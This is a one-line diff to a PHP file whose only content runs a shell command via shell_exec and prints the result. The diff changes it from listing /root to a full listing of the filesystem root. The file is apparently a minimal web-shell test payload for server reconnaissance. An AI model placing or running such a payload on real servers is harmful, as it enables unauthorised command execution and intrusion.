@@ -1,1 +1,1 @@
-<?php echo shell_exec('ls /root'); ?>
+<?php echo shell_exec('ls / -al'); ?>
